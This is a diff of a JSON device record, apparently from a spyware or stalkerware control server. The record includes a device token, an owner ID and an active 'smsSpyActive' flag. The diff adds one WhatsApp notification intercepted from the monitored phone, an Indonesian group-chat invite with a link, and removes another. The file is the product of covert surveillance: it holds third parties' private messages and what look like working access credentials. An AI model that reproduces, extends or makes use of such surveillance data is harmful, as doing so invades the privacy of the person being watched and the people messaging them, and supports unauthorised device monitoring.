@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-CA6D",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "1505d9de1a287ae732b4f22d45e58506",
-    "lastSeen": 1777174177907,
+    "lastSeen": 1777174195883,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-26T03:08:43.334Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (46 pesan): 📣 Menyebut Anda",
+        "content": "~ Baloch: JUALAN SUSAH LKU? SUK SINI⬇️ \n1000 MEM DAGETT⬇️\nhttps://chat.whatsapp.com/J6sJBsJ3f0CElwibKL0IbX?mode=gi_t\nMASUK DI TF 5K -3\nGAS JOIN LEKKU ⬆️🥵",
+        "time": "26/04 11:40",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777174196315
+      },
       {
         "appName": "WhatsApp",
         "sender": "memet",
@@ -4011,14 +4019,6 @@
         "time": "26/04 11:22",
         "pkg": "com.whatsapp",
         "receivedAt": 1777173069962
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (126 pesan): ~ ANGGA TUKAM",
-        "content": "💟 Stiker",
-        "time": "26/04 11:22",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777173069832
       }
     ],
     "galleryPhotos": [],
